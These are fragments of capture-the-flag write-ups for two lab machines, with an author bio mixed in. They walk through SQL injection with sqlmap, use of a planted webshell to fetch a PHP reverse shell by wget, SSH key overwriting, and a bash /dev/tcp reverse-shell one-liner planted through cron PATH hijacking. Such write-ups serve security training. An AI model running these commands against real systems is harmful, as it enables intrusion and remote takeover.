content: Reverse ShellSend a php reverse shell file. We cannot access the file by the original name.The file name changed after the files upload.Let’s use SQL injection again to find the name of the file. Filname:- sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --random-agent -v 3 --batch --tables sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --random-agent -v 3 --batch -T chats --dump Exploiting:- Start Listener:- sudo pwncat-cs -l -p 1234 Visit the link:- http://chat.olympus.thm/uploads/1323f6d43cd467f78da284dee8106534.php
title: Olympus

content: Local Privilege Escalation:- Generate ssh key:- ssh-keygen Copy the id_rsa.pub to the victim machine. Overwrite:- Run the cputils and Select the id_rsa.pub and set the target to /home/zeus/.ssh/authorized_keys ssh login as zeus:-
title: Olympus

content: Root:- Let’s Visit the php page:- Login using the password which found inside the php file. Start Listener:- Set Ip=[your ip]&port=[listener port] http://10.10.194.107/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=10.18.8.246&port=4321 We got shell:-
title: Olympus

content: Hi, I’m Monit👋. → I live in Gujarat,India, and I’m a Cyber Security Student → I avoid love coffee* (sidenote: But I did go through a zero-caffeine phase, so now I’m a rather moderate coffee drinker.), tweet occasionally, have a few → interesting side projects, and try to do open source. → To get a better idea of what I’ve been working on, check out my GitHub. → If you like any of my projects, or posts on this blog, please do let me know via email, I’d love to hear from you!

content: cvs dir:-There is a cvs directory that holds all uploaded files. Once we have looked at our uploaded file, It’s not being uploaded. But we know the hacker hacked it. So maybe the hacker leaves the Webshell out there. Let’s start fuzzing.
title: hacker_vs_hacker

content: Fuzzing:-Fuzzing file Name:- sudo ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.12.146/cvs/FUZZ.pdf.php Fuzzing parameter Name:- sudo ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.12.146/cvs/shell.pdf.php?FUZZ=ls -fs 18

content: Webshell:- http://10.10.12.146/cvs/shell.pdf.php?cmd=ls

content: Reverse ShellUploading Reverse shell:- I have uploaded a reverse shell using wget. http://10.10.12.146/cvs/shell.pdf.php?cmd=wget%20http://10.8.237.155:8000/php-reverse-shell.php Getting Reverse shell:- http://10.10.12.146/cvs/shell.pdf.php?cmd=php%20php-reverse-shell.php
title: hacker_vs_hacker

content: Privilege Escalation:-Local Privilege Escalation:- We can see the history file has some size. Root Privilege Escalation:- We can see the crontab using pkill repeatly PATH:/home/lachlan/bin;/bin;/usr/bin First its check /home/lachlan/bin then /bin/ at the end /usr/bin So we can have an pkill file which contains reverse shell in /home/lachlan/bin which will executed by crontab echo "bash -c 'bash -i >& /dev/tcp/10.8.237.155/9001 0>&1'" > pkill
title: hacker_vs_hacker
